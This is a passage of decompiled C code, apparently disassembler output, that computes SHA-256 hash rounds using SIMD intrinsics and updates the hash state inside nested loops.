        LODWORD(v1221) = v986 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1222 = (v986 & (v1792 ^ v1750) ^ v1792) + (v1221 >> 6);
        v1223 = result;
        LODWORD(v1221) = result;
        HIDWORD(v1221) = result;
        v1548 = result;
        v1224 = result ^ (v1221 >> 9);
        v1225 = v1584 ^ result;
        LODWORD(v1221) = v1224;
        HIDWORD(v1221) = v1224;
        v1226 = v1855 + v1834 + v1222;
        LODWORD(v1221) = v1223 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1227 = (v1221 >> 2) + v1226 + (v1584 ^ v1225 & v985);
        LODWORD(v1221) = v1667 + v1226;
        HIDWORD(v1221) = v1667 + v1226;
        LODWORD(v1221) = (v1667 + v1226) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1671 = v1667 + v1226;
        LODWORD(v1221) = v1671 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1228 = (v1671 & (v1750 ^ v1712) ^ v1750) + (v1221 >> 6);
        v1229 = v1227;
        LODWORD(v1221) = v1227;
        HIDWORD(v1221) = v1227;
        v1838 = v1227;
        v1230 = v1227 ^ (v1221 >> 9);
        v1231 = v1548 ^ v1227;
        LODWORD(v1221) = v1230;
        HIDWORD(v1221) = v1230;
        v1232 = DWORD1(v1855) + v1792 + v1228;
        LODWORD(v1221) = v1229 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1233 = (v1221 >> 2) + v1232 + (v1548 ^ v1231 & v1225);
        LODWORD(v1221) = v1624 + v1232;
        HIDWORD(v1221) = v1624 + v1232;
        LODWORD(v1221) = (v1624 + v1232) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1628 = v1624 + v1232;
        LODWORD(v1221) = v1628 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1234 = (v1628 & (v1712 ^ v1671) ^ v1712) + (v1221 >> 6);
        v1235 = v1233;
        LODWORD(v1221) = v1233;
        HIDWORD(v1221) = v1233;
        v1796 = v1233;
        v1236 = v1233 ^ (v1221 >> 9);
        v1237 = v1838 ^ v1233;
        LODWORD(v1221) = v1236;
        HIDWORD(v1221) = v1236;
        v1238 = DWORD2(v1855) + v1750 + v1234;
        LODWORD(v1221) = v1235 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1239 = (v1221 >> 2) + v1238 + (v1838 ^ v1237 & v1231);
        LODWORD(v1221) = v1584 + v1238;
        HIDWORD(v1221) = v1584 + v1238;
        LODWORD(v1221) = (v1584 + v1238) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1588 = v1584 + v1238;
        LODWORD(v1221) = v1588 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1240 = (v1588 & (v1671 ^ v1628) ^ v1671) + (v1221 >> 6);
        v1241 = v1239;
        LODWORD(v1221) = v1239;
        HIDWORD(v1221) = v1239;
        v1754 = v1239;
        v1242 = v1239 ^ (v1221 >> 9);
        v1243 = v1796 ^ v1239;
        LODWORD(v1221) = v1242;
        HIDWORD(v1221) = v1242;
        v1244 = HIDWORD(v1855) + v1712 + v1240;
        LODWORD(v1221) = v1241 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1245 = (v1221 >> 2) + v1244 + (v1796 ^ v1243 & v1237);
        LODWORD(v1221) = v1548 + v1244;
        HIDWORD(v1221) = v1548 + v1244;
        LODWORD(v1221) = (v1548 + v1244) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1549 = v1548 + v1244;
        LODWORD(v1221) = v1549 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1246 = (v1549 & (v1628 ^ v1588) ^ v1628) + (v1221 >> 6);
        v1247 = v1245;
        LODWORD(v1221) = v1245;
        HIDWORD(v1221) = v1245;
        v1713 = v1245;
        v1248 = v1245 ^ (v1221 >> 9);
        v1249 = v1754 ^ v1245;
        LODWORD(v1221) = v1248;
        HIDWORD(v1221) = v1248;
        v1250 = v1874 + v1671 + v1246;
        LODWORD(v1221) = v1247 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1251 = (v1221 >> 2) + v1250 + (v1754 ^ v1249 & v1243);
        LODWORD(v1221) = v1838 + v1250;
        HIDWORD(v1221) = v1838 + v1250;
        LODWORD(v1221) = (v1838 + v1250) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1839 = v1838 + v1250;
        LODWORD(v1221) = v1839 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1252 = (v1839 & (v1588 ^ v1549) ^ v1588) + (v1221 >> 6);
        v1253 = v1251;
        LODWORD(v1221) = v1251;
        HIDWORD(v1221) = v1251;
        v1672 = v1251;
        v1254 = v1251 ^ (v1221 >> 9);
        v1255 = v1713 ^ v1251;
        LODWORD(v1221) = v1254;
        HIDWORD(v1221) = v1254;
        v1256 = DWORD1(v1874) + v1628 + v1252;
        LODWORD(v1221) = v1253 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1257 = (v1221 >> 2) + v1256 + (v1713 ^ v1255 & v1249);
        LODWORD(v1221) = v1796 + v1256;
        HIDWORD(v1221) = v1796 + v1256;
        LODWORD(v1221) = (v1796 + v1256) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1797 = v1796 + v1256;
        LODWORD(v1221) = v1797 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1258 = (v1797 & (v1549 ^ v1839) ^ v1549) + (v1221 >> 6);
        v1259 = v1257;
        LODWORD(v1221) = v1257;
        HIDWORD(v1221) = v1257;
        v1629 = v1257;
        v1260 = v1257 ^ (v1221 >> 9);
        v1261 = v1672 ^ v1257;
        LODWORD(v1221) = v1260;
        HIDWORD(v1221) = v1260;
        v1262 = DWORD2(v1874) + v1588 + v1258;
        LODWORD(v1221) = v1259 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1263 = (v1221 >> 2) + v1262 + (v1672 ^ v1261 & v1255);
        LODWORD(v1221) = v1754 + v1262;
        HIDWORD(v1221) = v1754 + v1262;
        LODWORD(v1221) = (v1754 + v1262) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1755 = v1754 + v1262;
        LODWORD(v1221) = v1755 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1264 = (v1755 & (v1839 ^ v1797) ^ v1839) + (v1221 >> 6);
        v1265 = v1263;
        LODWORD(v1221) = v1263;
        HIDWORD(v1221) = v1263;
        v1589 = v1263;
        v1266 = v1263 ^ (v1221 >> 9);
        v1267 = v1629 ^ v1263;
        LODWORD(v1221) = v1266;
        HIDWORD(v1221) = v1266;
        v1268 = HIDWORD(v1874) + v1549 + v1264;
        LODWORD(v1221) = v1265 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1269 = (v1221 >> 2) + v1268 + (v1629 ^ v1267 & v1261);
        LODWORD(v1221) = v1713 + v1268;
        HIDWORD(v1221) = v1713 + v1268;
        LODWORD(v1221) = (v1713 + v1268) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1714 = v1713 + v1268;
        LODWORD(v1221) = v1714 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1270 = (v1714 & (v1797 ^ v1755) ^ v1797) + (v1221 >> 6);
        v1271 = v1269;
        LODWORD(v1221) = v1269;
        HIDWORD(v1221) = v1269;
        v1550 = v1269;
        v1272 = v1269 ^ (v1221 >> 9);
        v1273 = v1589 ^ v1269;
        LODWORD(v1221) = v1272;
        HIDWORD(v1221) = v1272;
        v1274 = v1894 + v1839 + v1270;
        LODWORD(v1221) = v1271 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1275 = (v1221 >> 2) + v1274 + (v1589 ^ v1273 & v1267);
        LODWORD(v1221) = v1672 + v1274;
        HIDWORD(v1221) = v1672 + v1274;
        LODWORD(v1221) = (v1672 + v1274) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1673 = v1672 + v1274;
        LODWORD(v1221) = v1673 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1276 = (v1673 & (v1755 ^ v1714) ^ v1755) + (v1221 >> 6);
        v1277 = v1275;
        LODWORD(v1221) = v1275;
        HIDWORD(v1221) = v1275;
        v1840 = v1275;
        v1278 = v1275 ^ (v1221 >> 9);
        v1279 = v1550 ^ v1275;
        LODWORD(v1221) = v1278;
        HIDWORD(v1221) = v1278;
        v1280 = DWORD1(v1894) + v1797 + v1276;
        LODWORD(v1221) = v1277 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1281 = (v1221 >> 2) + v1280 + (v1550 ^ v1279 & v1273);
        LODWORD(v1221) = v1629 + v1280;
        HIDWORD(v1221) = v1629 + v1280;
        LODWORD(v1221) = (v1629 + v1280) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1630 = v1629 + v1280;
        LODWORD(v1221) = v1630 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1282 = (v1630 & (v1714 ^ v1673) ^ v1714) + (v1221 >> 6);
        v1283 = v1281;
        LODWORD(v1221) = v1281;
        HIDWORD(v1221) = v1281;
        v1798 = v1281;
        v1284 = v1281 ^ (v1221 >> 9);
        v1285 = v1840 ^ v1281;
        LODWORD(v1221) = v1284;
        HIDWORD(v1221) = v1284;
        v1286 = DWORD2(v1894) + v1755 + v1282;
        LODWORD(v1221) = v1283 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1287 = (v1221 >> 2) + v1286 + (v1840 ^ v1285 & v1279);
        LODWORD(v1221) = v1589 + v1286;
        HIDWORD(v1221) = v1589 + v1286;
        LODWORD(v1221) = (v1589 + v1286) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1590 = v1589 + v1286;
        LODWORD(v1221) = v1590 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1288 = (v1590 & (v1673 ^ v1630) ^ v1673) + (v1221 >> 6);
        v1289 = v1287;
        LODWORD(v1221) = v1287;
        HIDWORD(v1221) = v1287;
        v1756 = v1287;
        v1290 = v1287 ^ (v1221 >> 9);
        v1291 = v1798 ^ v1287;
        LODWORD(v1221) = v1290;
        HIDWORD(v1221) = v1290;
        v1292 = HIDWORD(v1894) + v1714 + v1288;
        LODWORD(v1221) = v1289 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1293 = (v1221 >> 2) + v1292 + (v1798 ^ v1291 & v1285);
        LODWORD(v1221) = v1550 + v1292;
        HIDWORD(v1221) = v1550 + v1292;
        LODWORD(v1221) = (v1550 + v1292) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1551 = v1550 + v1292;
        LODWORD(v1221) = v1551 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1294 = (v1551 & (v1630 ^ v1590) ^ v1630) + (v1221 >> 6);
        v1295 = v1293;
        LODWORD(v1221) = v1293;
        HIDWORD(v1221) = v1293;
        v1715 = v1293;
        v1296 = v1293 ^ (v1221 >> 9);
        v1297 = v1756 ^ v1293;
        LODWORD(v1221) = v1296;
        HIDWORD(v1221) = v1296;
        v1298 = v1914 + v1673 + v1294;
        LODWORD(v1221) = v1295 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1299 = (v1221 >> 2) + v1298 + (v1756 ^ v1297 & v1291);
        LODWORD(v1221) = v1840 + v1298;
        HIDWORD(v1221) = v1840 + v1298;
        LODWORD(v1221) = (v1840 + v1298) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1841 = v1840 + v1298;
        LODWORD(v1221) = v1841 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1300 = (v1841 & (v1590 ^ v1551) ^ v1590) + (v1221 >> 6);
        v1301 = v1299;
        LODWORD(v1221) = v1299;
        HIDWORD(v1221) = v1299;
        v1674 = v1299;
        v1302 = v1299 ^ (v1221 >> 9);
        v1303 = v1715 ^ v1299;
        LODWORD(v1221) = v1302;
        HIDWORD(v1221) = v1302;
        v1304 = DWORD1(v1914) + v1630 + v1300;
        LODWORD(v1221) = v1301 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1305 = (v1221 >> 2) + v1304 + (v1715 ^ v1303 & v1297);
        LODWORD(v1221) = v1798 + v1304;
        HIDWORD(v1221) = v1798 + v1304;
        LODWORD(v1221) = (v1798 + v1304) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1799 = v1798 + v1304;
        LODWORD(v1221) = v1799 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1306 = (v1799 & (v1551 ^ v1841) ^ v1551) + (v1221 >> 6);
        v1307 = v1305;
        LODWORD(v1221) = v1305;
        HIDWORD(v1221) = v1305;
        v1631 = v1305;
        v1308 = v1305 ^ (v1221 >> 9);
        v1309 = v1674 ^ v1305;
        LODWORD(v1221) = v1308;
        HIDWORD(v1221) = v1308;
        v1310 = DWORD2(v1914) + v1590 + v1306;
        LODWORD(v1221) = v1307 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        v1311 = (v1221 >> 2) + v1310 + (v1674 ^ v1309 & v1303);
        LODWORD(v1221) = v1756 + v1310;
        HIDWORD(v1221) = v1756 + v1310;
        LODWORD(v1221) = (v1756 + v1310) ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1757 = v1756 + v1310;
        LODWORD(v1221) = v1757 ^ (v1221 >> 5);
        HIDWORD(v1221) = v1221;
        v1312 = (v1757 & (v1841 ^ v1799) ^ v1841) + (v1221 >> 6);
        v1313 = v1311;
        LODWORD(v1221) = v1311;
        HIDWORD(v1221) = v1311;
        v1314 = v1311 ^ (v1221 >> 9);
        v1315 = v1631 ^ v1311;
        LODWORD(v1221) = v1314;
        HIDWORD(v1221) = v1314;
        v1316 = HIDWORD(v1914) + v1551 + v1312;
        LODWORD(v1221) = v1313 ^ (v1221 >> 11);
        HIDWORD(v1221) = v1221;
        result = v1933->m128i_i32[0] + (v1221 >> 2) + v1316 + (v1631 ^ v1315 & v1309);
        v1317 = v1933->m128i_i32[1] + (v1631 ^ v1315);
        v1318 = v1933->m128i_i32[2] + v1631;
        v1319 = v1933->m128i_i32[3] + v1674;
        v1933->m128i_i32[0] = result;
        v1933->m128i_i32[1] = v1317;
        v1933->m128i_i32[2] = v1318;
        v1933->m128i_i32[3] = v1319;
        v1584 = v1317;
        v985 = v1318 ^ v1317;
        v1624 = v1318;
        v1667 = v1319;
        v986 = v1933[1].m128i_i32[0] + v1715 + v1316;
        v1320 = v1933[1].m128i_i32[1] + v1757;
        v1321 = v1933[1].m128i_i32[2] + v1799;
        v1933[1].m128i_i32[0] = v986;
        v1933[1].m128i_i32[1] = v1320;
        v1750 = v1320;
        v1933[1].m128i_i32[2] = v1321;
        v1322 = v1933[1].m128i_i32[3] + v1841;
        v1792 = v1321;
        v1933[1].m128i_i32[3] = v1322;
        v1834 = v1322;
        _EDI = (const __m128i *)v1929;
        __asm { vmovdqa xmm7, xmmword ptr [ebp+40h] }
        _EBP -= 12;
      }
      while ( v1929 < v1931 );
      __asm { vzeroall }
    }
  }
  else
  {
    if ( (*(&dword_73C6D0 + 1) & 0x200) == 0 )
      goto LABEL_6;
    result = v1933->m128i_i32[0];
    v1577 = v1933->m128i_i32[1];
    v675 = v1933->m128i_i32[2] ^ v1577;
    v1616 = v1933->m128i_i32[2];
    v1659 = v1933->m128i_i32[3];
    v676 = v1933[1].m128i_i32[0];
    v1742 = v1933[1].m128i_i32[1];
    v677 = v1934;
    v1784 = v1933[1].m128i_i32[2];
    v1826 = v1933[1].m128i_i32[3];
    v678 = _mm_load_si128((const __m128i *)&SHA512_Constants_46C840[64]);
    do
    {
      v679 = _mm_shuffle_epi8(_mm_loadu_si128(v677), v678);
      v1928 = v677 + 4;
      v680 = _mm_shuffle_epi8(_mm_loadu_si128(v677 + 1), v678);
      v681 = _mm_shuffle_epi8(_mm_loadu_si128(v677 + 2), v678);
      v682 = _mm_shuffle_epi8(_mm_loadu_si128(v677 + 3), v678);
      v1854 = _mm_add_epi32(_mm_load_si128(_EBP), v679);
      v1873 = _mm_add_epi32(_mm_load_si128(_EBP + 1), v680);
      v1893 = _mm_add_epi32(_mm_load_si128(_EBP + 2), v681);
      v1913 = _mm_add_epi32(_mm_load_si128(_EBP + 3), v682);
      do
      {
        _EBP += 4;
        v1700 = v676;
        v683 = _mm_alignr_epi8(v680, v679, 4);
        v684 = _mm_srli_epi32(v683, 3u);
        v685 = result;
        v1536 = result;
        v686 = result ^ __ROR4__(result, 9);
        v687 = _mm_srli_epi32(v683, 7u);
        v688 = v1577 ^ result;
        v689 = v1854.m128i_i32[0]
             + v1826
             + (v676 & (v1784 ^ v1742) ^ v1784)
             + __ROR4__(v676 ^ __ROR4__(v676 ^ __ROR4__(v676, 14), 5), 6);
        v690 = _mm_slli_epi32(v683, 0xEu);
        v691 = __ROR4__(v685 ^ __ROR4__(v686, 11), 2) + v689 + (v1577 ^ v688 & v675);
        v692 = v1659 + v689;
        v693 = __ROR4__((v1659 + v689) ^ __ROR4__(v1659 + v689, 14), 5);
        v694 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v684, v687), v690), _mm_srli_epi32(v687, 0xBu));
        v1660 = v692;
        v695 = _mm_shuffle_epi32(v682, 250);
        v696 = (v692 & (v1742 ^ v1700) ^ v1742) + __ROR4__(v692 ^ v693, 6);
        v697 = _mm_srli_epi32(v695, 0xAu);
        v698 = v691;
        v1827 = v691;
        v699 = v691 ^ __ROR4__(v691, 9);
        v700 = _mm_srli_epi64(v695, 0x11u);
        v701 = v1536 ^ v691;
        v702 = v1854.m128i_i32[1] + v1784 + v696;
        v703 = __ROR4__(v698 ^ __ROR4__(v699, 11), 2) + v702 + (v1536 ^ v701 & v688);
        v704 = v1616 + v702;
        v705 = __ROR4__((v1616 + v702) ^ __ROR4__(v1616 + v702, 14), 5);
        v1617 = v704;
        v706 = _mm_add_epi32(
                 _mm_add_epi32(
                   _mm_add_epi32(v679, _mm_alignr_epi8(v682, v681, 4)),
                   _mm_xor_si128(v694, _mm_slli_epi32(v690, 0xBu))),
                 _mm_srli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v697, v700), _mm_srli_epi64(v700, 2u)), 128),
                   8));
        v707 = (v704 & (v1700 ^ v1660) ^ v1700) + __ROR4__(v704 ^ v705, 6);
        v708 = v703;
        v1785 = v703;
        v709 = v703 ^ __ROR4__(v703, 9);
        v710 = v1827 ^ v703;
        v711 = _mm_shuffle_epi32(v706, 80);
        v712 = _mm_srli_epi32(v711, 0xAu);
        v713 = _mm_srli_epi64(v711, 0x11u);
        v714 = v1854.m128i_i32[2] + v1742 + v707;
        v715 = __ROR4__(v708 ^ __ROR4__(v709, 11), 2) + v714 + (v1827 ^ v710 & v701);
        v716 = v1577 + v714;
        v717 = __ROR4__((v1577 + v714) ^ __ROR4__(v1577 + v714, 14), 5);
        v1578 = v716;
        v718 = (v716 & (v1660 ^ v1617) ^ v1660) + __ROR4__(v716 ^ v717, 6);
        v719 = v715;
        v679 = _mm_add_epi32(
                 v706,
                 _mm_slli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v712, v713), _mm_srli_epi64(v713, 2u)), 8),
                   8));
        v1743 = v715;
        v720 = v715 ^ __ROR4__(v715, 9);
        v721 = v1785 ^ v715;
        v722 = v1854.m128i_i32[3] + v1700 + v718;
        v723 = __ROR4__(v719 ^ __ROR4__(v720, 11), 2) + v722 + (v1785 ^ v721 & v710);
        v1854 = _mm_add_epi32(_mm_load_si128(_EBP), v679);
        v724 = v1536 + v722;
        v725 = __ROR4__((v1536 + v722) ^ __ROR4__(v1536 + v722, 14), 5);
        v1537 = v724;
        v726 = _mm_alignr_epi8(v681, v680, 4);
        v727 = (v724 & (v1617 ^ v1578) ^ v1617) + __ROR4__(v724 ^ v725, 6);
        v728 = _mm_srli_epi32(v726, 3u);
        v729 = v723;
        v1701 = v723;
        v730 = v723 ^ __ROR4__(v723, 9);
        v731 = _mm_srli_epi32(v726, 7u);
        v732 = v1743 ^ v723;
        v733 = v1873.m128i_i32[0] + v1660 + v727;
        v734 = _mm_slli_epi32(v726, 0xEu);
        v735 = __ROR4__(v729 ^ __ROR4__(v730, 11), 2) + v733 + (v1743 ^ v732 & v721);
        v736 = v1827 + v733;
        v737 = __ROR4__((v1827 + v733) ^ __ROR4__(v1827 + v733, 14), 5);
        v738 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v728, v731), v734), _mm_srli_epi32(v731, 0xBu));
        v1828 = v736;
        v739 = _mm_shuffle_epi32(v679, 250);
        v740 = (v736 & (v1578 ^ v1537) ^ v1578) + __ROR4__(v736 ^ v737, 6);
        v741 = _mm_srli_epi32(v739, 0xAu);
        v742 = v735;
        v1661 = v735;
        v743 = v735 ^ __ROR4__(v735, 9);
        v744 = _mm_srli_epi64(v739, 0x11u);
        v745 = v1701 ^ v735;
        v746 = v1873.m128i_i32[1] + v1617 + v740;
        v747 = __ROR4__(v742 ^ __ROR4__(v743, 11), 2) + v746 + (v1701 ^ v745 & v732);
        v748 = v1785 + v746;
        v749 = __ROR4__((v1785 + v746) ^ __ROR4__(v1785 + v746, 14), 5);
        v1786 = v748;
        v750 = _mm_add_epi32(
                 _mm_add_epi32(
                   _mm_add_epi32(v680, _mm_alignr_epi8(v679, v682, 4)),
                   _mm_xor_si128(v738, _mm_slli_epi32(v734, 0xBu))),
                 _mm_srli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v741, v744), _mm_srli_epi64(v744, 2u)), 128),
                   8));
        v751 = (v748 & (v1537 ^ v1828) ^ v1537) + __ROR4__(v748 ^ v749, 6);
        v752 = v747;
        v1618 = v747;
        v753 = v747 ^ __ROR4__(v747, 9);
        v754 = v1661 ^ v747;
        v755 = _mm_shuffle_epi32(v750, 80);
        v756 = _mm_srli_epi32(v755, 0xAu);
        v757 = _mm_srli_epi64(v755, 0x11u);
        v758 = v1873.m128i_i32[2] + v1578 + v751;
        v759 = __ROR4__(v752 ^ __ROR4__(v753, 11), 2) + v758 + (v1661 ^ v754 & v745);
        v760 = v1743 + v758;
        v761 = __ROR4__((v1743 + v758) ^ __ROR4__(v1743 + v758, 14), 5);
        v1744 = v760;
        v762 = (v760 & (v1828 ^ v1786) ^ v1828) + __ROR4__(v760 ^ v761, 6);
        v763 = v759;
        v680 = _mm_add_epi32(
                 v750,
                 _mm_slli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v756, v757), _mm_srli_epi64(v757, 2u)), 8),
                   8));
        v1579 = v759;
        v764 = v759 ^ __ROR4__(v759, 9);
        v765 = v1618 ^ v759;
        v766 = v1873.m128i_i32[3] + v1537 + v762;
        v767 = __ROR4__(v763 ^ __ROR4__(v764, 11), 2) + v766 + (v1618 ^ v765 & v754);
        v1873 = _mm_add_epi32(_mm_load_si128(_EBP + 1), v680);
        v768 = v1701 + v766;
        v769 = __ROR4__((v1701 + v766) ^ __ROR4__(v1701 + v766, 14), 5);
        v1702 = v768;
        v770 = _mm_alignr_epi8(v682, v681, 4);
        v771 = (v768 & (v1786 ^ v1744) ^ v1786) + __ROR4__(v768 ^ v769, 6);
        v772 = _mm_srli_epi32(v770, 3u);
        v773 = v767;
        v1538 = v767;
        v774 = v767 ^ __ROR4__(v767, 9);
        v775 = _mm_srli_epi32(v770, 7u);
        v776 = v1579 ^ v767;
        v777 = v1893.m128i_i32[0] + v1828 + v771;
        v778 = _mm_slli_epi32(v770, 0xEu);
        v779 = __ROR4__(v773 ^ __ROR4__(v774, 11), 2) + v777 + (v1579 ^ v776 & v765);
        v780 = v1661 + v777;
        v781 = __ROR4__((v1661 + v777) ^ __ROR4__(v1661 + v777, 14), 5);
        v782 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v772, v775), v778), _mm_srli_epi32(v775, 0xBu));
        v1662 = v780;
        v783 = _mm_shuffle_epi32(v680, 250);
        v784 = (v780 & (v1744 ^ v1702) ^ v1744) + __ROR4__(v780 ^ v781, 6);
        v785 = _mm_srli_epi32(v783, 0xAu);
        v786 = v779;
        v1829 = v779;
        v787 = v779 ^ __ROR4__(v779, 9);
        v788 = _mm_srli_epi64(v783, 0x11u);
        v789 = v1538 ^ v779;
        v790 = v1893.m128i_i32[1] + v1786 + v784;
        v791 = __ROR4__(v786 ^ __ROR4__(v787, 11), 2) + v790 + (v1538 ^ v789 & v776);
        v792 = v1618 + v790;
        v793 = __ROR4__((v1618 + v790) ^ __ROR4__(v1618 + v790, 14), 5);
        v1619 = v792;
        v794 = _mm_add_epi32(
                 _mm_add_epi32(
                   _mm_add_epi32(v681, _mm_alignr_epi8(v680, v679, 4)),
                   _mm_xor_si128(v782, _mm_slli_epi32(v778, 0xBu))),
                 _mm_srli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v785, v788), _mm_srli_epi64(v788, 2u)), 128),
                   8));
        v795 = (v792 & (v1702 ^ v1662) ^ v1702) + __ROR4__(v792 ^ v793, 6);
        v796 = v791;
        v1787 = v791;
        v797 = v791 ^ __ROR4__(v791, 9);
        v798 = v1829 ^ v791;
        v799 = _mm_shuffle_epi32(v794, 80);
        v800 = _mm_srli_epi32(v799, 0xAu);
        v801 = _mm_srli_epi64(v799, 0x11u);
        v802 = v1893.m128i_i32[2] + v1744 + v795;
        v803 = __ROR4__(v796 ^ __ROR4__(v797, 11), 2) + v802 + (v1829 ^ v798 & v789);
        v804 = v1579 + v802;
        v805 = __ROR4__((v1579 + v802) ^ __ROR4__(v1579 + v802, 14), 5);
        v1580 = v804;
        v806 = (v804 & (v1662 ^ v1619) ^ v1662) + __ROR4__(v804 ^ v805, 6);
        v807 = v803;
        v681 = _mm_add_epi32(
                 v794,
                 _mm_slli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v800, v801), _mm_srli_epi64(v801, 2u)), 8),
                   8));
        v1745 = v803;
        v808 = v803 ^ __ROR4__(v803, 9);
        v809 = v1787 ^ v803;
        v810 = v1893.m128i_i32[3] + v1702 + v806;
        v811 = __ROR4__(v807 ^ __ROR4__(v808, 11), 2) + v810 + (v1787 ^ v809 & v798);
        v1893 = _mm_add_epi32(_mm_load_si128(_EBP + 2), v681);
        v812 = v1538 + v810;
        v813 = __ROR4__((v1538 + v810) ^ __ROR4__(v1538 + v810, 14), 5);
        v1539 = v812;
        v814 = _mm_alignr_epi8(v679, v682, 4);
        v815 = (v812 & (v1619 ^ v1580) ^ v1619) + __ROR4__(v812 ^ v813, 6);
        v816 = _mm_srli_epi32(v814, 3u);
        v817 = v811;
        v1703 = v811;
        v818 = v811 ^ __ROR4__(v811, 9);
        v819 = _mm_srli_epi32(v814, 7u);
        v820 = v1745 ^ v811;
        v821 = v1913.m128i_i32[0] + v1662 + v815;
        v822 = _mm_slli_epi32(v814, 0xEu);
        v823 = __ROR4__(v817 ^ __ROR4__(v818, 11), 2) + v821 + (v1745 ^ v820 & v809);
        v824 = v1829 + v821;
        v825 = __ROR4__((v1829 + v821) ^ __ROR4__(v1829 + v821, 14), 5);
        v826 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v816, v819), v822), _mm_srli_epi32(v819, 0xBu));
        v1826 = v824;
        v827 = _mm_shuffle_epi32(v681, 250);
        v828 = (v824 & (v1580 ^ v1539) ^ v1580) + __ROR4__(v824 ^ v825, 6);
        v829 = _mm_srli_epi32(v827, 0xAu);
        v830 = v823;
        v1659 = v823;
        v831 = v823 ^ __ROR4__(v823, 9);
        v832 = _mm_srli_epi64(v827, 0x11u);
        v833 = v1703 ^ v823;
        v834 = v1913.m128i_i32[1] + v1619 + v828;
        v835 = __ROR4__(v830 ^ __ROR4__(v831, 11), 2) + v834 + (v1703 ^ v833 & v820);
        v836 = v1787 + v834;
        v837 = __ROR4__((v1787 + v834) ^ __ROR4__(v1787 + v834, 14), 5);
        v1784 = v836;
        v838 = _mm_add_epi32(
                 _mm_add_epi32(
                   _mm_add_epi32(v682, _mm_alignr_epi8(v681, v680, 4)),
                   _mm_xor_si128(v826, _mm_slli_epi32(v822, 0xBu))),
                 _mm_srli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v829, v832), _mm_srli_epi64(v832, 2u)), 128),
                   8));
        v839 = (v836 & (v1539 ^ v1826) ^ v1539) + __ROR4__(v836 ^ v837, 6);
        v840 = v835;
        v1616 = v835;
        v841 = v835 ^ __ROR4__(v835, 9);
        v842 = v1659 ^ v835;
        v843 = _mm_shuffle_epi32(v838, 80);
        v844 = _mm_srli_epi32(v843, 0xAu);
        v845 = _mm_srli_epi64(v843, 0x11u);
        v846 = v1913.m128i_i32[2] + v1580 + v839;
        v847 = __ROR4__(v840 ^ __ROR4__(v841, 11), 2) + v846 + (v1659 ^ v842 & v833);
        v848 = v1745 + v846;
        v849 = __ROR4__((v1745 + v846) ^ __ROR4__(v1745 + v846, 14), 5);
        v1742 = v848;
        v850 = (v848 & (v1826 ^ v1784) ^ v1826) + __ROR4__(v848 ^ v849, 6);
        v851 = v847;
        v682 = _mm_add_epi32(
                 v838,
                 _mm_slli_si128(
                   _mm_shuffle_epi32(_mm_xor_si128(_mm_xor_si128(v844, v845), _mm_srli_epi64(v845, 2u)), 8),
                   8));
        v1577 = v847;
        v852 = v847 ^ __ROR4__(v847, 9);
        v675 = v1616 ^ v847;
        v853 = v1913.m128i_i32[3] + v1539 + v850;
        v854 = v853 + (v1616 ^ v675 & v842);
        v676 = v1703 + v853;
